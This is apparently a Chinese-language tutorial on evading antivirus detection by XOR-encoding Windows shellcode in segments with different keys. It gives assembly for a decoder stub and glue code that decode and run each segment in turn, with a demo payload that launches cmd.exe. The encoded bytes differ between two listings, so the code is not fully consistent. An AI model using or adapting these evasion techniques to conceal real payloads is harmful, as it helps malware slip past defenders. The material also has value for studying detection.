# 分段免杀
我们在写shellcode时候，做分段免杀执行时，如何做到边解码然后执行再调用解码，解码后再执行？就是分段执行而且解密的密钥是不一样的，对于这个问题，我们应该想想这三个问题。。

> 1、如何写出通用的解码子？
> 
> 2、如何才能调到解码子的解码部分首地址？
> 
> 3、如何才能跳到刚解码的shellcode首地址？

这三个问题想明白了，就能实现了

下面我们利用xor用不同秘钥加密弹出cmd程序来说明

## 写出我们的程

```
#include "stdio.h"
#include "windows.h"
#include <string.h>
#include "stdlib.h"
int main(int argc, char* argv[])
{
       char *str="cmd.exe";
  __asm{
              mov eax,str
              push 5                         ;5=SW_SHOW
              push eax
              mov eax,0x7731dab0
              //0x7731dab0
              //call dword ptr [WinExec]
              call eax

       }
       return 0;
}
```

0x7731dab0是winexec函数地址

##  转成shellcode形式

```
#include "stdio.h"
#include "windows.h"
#include <string.h>
#include "stdlib.h"
char shellcode[]="\x8B\x45\xFc\x6A\x05\x50\xB8\xB0\xDA\x50\x75\xFF\xD0";
int main(int argc, char* argv[])
{
	char *str="cmd.exe";
	__asm{
		lea eax,shellcode
		call eax
	}
	return 0;
}
```

运行看一下能不能执行

## xor加密

我们用三个秘钥对上面的shellcode加密，值分别为0×51,0×47,0×81，根据秘钥个数对shellcode分段，分成三段，0×51对对\\x8B\\x45\\xFc加密，0×47对\\x6A\\x05\\x50\\xB8\\xB0\\xDA\\x50\\x75加密，0×81对\\xFF\\xD0加密（一条语句的机器码不能分开），在每段后面加上\\x90，加个\\x90是控制解密的个数，这样我们可以想解密到哪里就解密到哪里，加密后的shellcode为

\\xda\\x14\\xad\\xc1

\\x2d\\x42\\x17\\xff\\xf7\\x9d\\x17\\x32\\xd7

\\x7e\\x51\\x11

## 写出通用的解码子

```
decode:	        mov bl,byte ptr ds:[ecx+edx]
		xor bl,bh
		mov byte ptr ds:[ecx+edx],bl
		inc edx
		cmp bl,90h
		je execute
		jmp decode

execute:	
		add ecx,edx		//ecx加上解码的数目
		ret
```

利用bh存储秘钥，通过解密出来的bl和90h比较来，如果解密出来是90h，停止解密，跳到execte出执行，最后返回，这里必须要用ret，因为这段程序要放到我们加密的shellcode前面，如果没有ret，程序将去执行shellcode，而后面还有shellocde将不会解密，我们要分段执行，所以解密之后我们还要回到原来调用解密的地方，便于后面的操作。

找出下面这段程序机器码放在第一段shellcode之前

```
	__asm{
		xor edx,edx
		mov bh,51h		//bh存储key	

decode:	mov bl,byte ptr ds:[ecx+edx]
		xor bl,bh
		mov byte ptr ds:[ecx+edx],bl
		inc edx
		cmp bl,90h
		je execute
		jmp decode

execute:	
		add ecx,edx		//ecx加上解码的数目
		ret

	}
```

## 逻辑处理语句

这里的逻辑处理语句是放在每段shellcode之间，做到存储和取解码子的解码部分首地址，跳到刚解码的shellcode首地址的功能，并且能够修改秘钥值。

```
	__asm{
		push edx	//将decode首地址也入栈
		add ecx,19	//这个是让ecx的值等于下一个shellcdoe首地址
		
		push ecx	//下一个shellcode首地址压入栈
		push eax	//将eax压入栈中（因为我们执行的代码中利用eax进行，eax值不能变）
		mov eax,edx	//将decode首地址传给eax
		xor edx,edx
		mov bh,47h	//第二段key，各段shellcode的key不同，要修改
		call eax	
		pop eax
		pop ebx		//shellcode首地址
		pop edx		//decode首地址
		jmp ebx		//到shellcode出执行
	}
```

每次执行完解码后的shellcode都会来执行这段语句，edx存放解码子的首地址，call eax会去解码，jmp ebx会去执行解码后的shellcode。从上面的代码解决了如何才能调到解码子的解码部分首地址的问题，通过一开始找到解码的首地址，压入栈，然后每次解码完，都弹出来给一个寄存器，执行完解码就去执行shellcode，执行完shellcode根据弹出来的解码首地址，再去解码。

找出这段程序机器码放在每段shellcode之间

## 定位shellcode首地址

分段解密执行，我们知道各段shellcode的首地址是不同的，怎么才能够找到能各段的shellcode首地址呢？

解密前，我们把下一个要解密的shellcode首地址压入栈，在执行call eax时，ecx的值是下一个要执行shellcode的首地址，解码子里有add ecx,edx，所以解码完ecx是下一个要执行的shellcode的尾地址再加1，再执行add ecx,19，19是逻辑处理那段的机器码数目，之后ecx就是下下个要执行的shllcode首地址，再通过出栈压栈，我们都能找到要执行shllcode首地址

## 最终程序

```
#include "stdio.h"
#include "windows.h"
#include <string.h>
#include "stdlib.h"

unsigned char encode[]="\x33\xD2\xB7\x51\x3E\x8A\x1C\x11\x32\xDF\x3E\x88\x1C\x11\x42\x80\xFB\x90\x74\x02\xEB\xEE\x03\xCA\xC3"
"\xda\x14\xad\xc1"
"\x52\x83\xC1\x13\x51\x50\x8B\xC2\x33\xD2\xB7\x47\xFF\xD0\x58\x5B\x5A\xFF\xE3"
"\x2d\x42\x17\xff\xf7\x9d\x76\x30\xd7"
"\x52\x83\xC1\x13\x51\x50\x8B\xC2\x33\xD2\xB7\x81\xFF\xD0\x58\x5B\x5A\xFF\xE3"
"\x7e\x51\x11";

int main(int argc, char* argv[])
{
	char *str="cmd.exe";
	
	__asm{
		lea ecx,encode		//获取encode+shellcode编码的地址
		mov edx,ecx
		add ecx,25			//ecx存储第一个shellcode首地址，从xor edx,edx到ret，这段的机器码
		push ecx			//第一个shellcode压入站首地址			
		sub ecx,21			//解码decode首地址，21第一个shellcode到解码的机器码数
		push ecx			//压入栈
		add ecx,21
		call edx			//解码
		pop edx				//解码首地址			
		pop ebx				//第一个shellccode首地址
		jmp ebx
	}

	return 0;

}
```

结果：

[![](_v_images/20200313104613600_6108.png)](https://.3001.net/_v_s/20200227/1582794505_5e5787098d6f5.png)

程序在开始时候，就把第一段shellcode首地址和解码子首地址压入栈，接着调用解码程序去解码第一段shellcode，解码完返回，接着弹出第一段shellcode首地址和解码子首地址，利用jmp去执行解码后的第一段shellcode，执行完，去执行0×04内容，根据弹出来的解码子首地址，再去解码第二段shellcode，然后执行，依次类推

## 总结

> 1、解码执行第二段代码的密钥在第一段里面
> 
> 2、利用好ret，解码后返回
> 
> 3、多利用push，pop，比如shllcode首地址和解码子首地址的入栈、出栈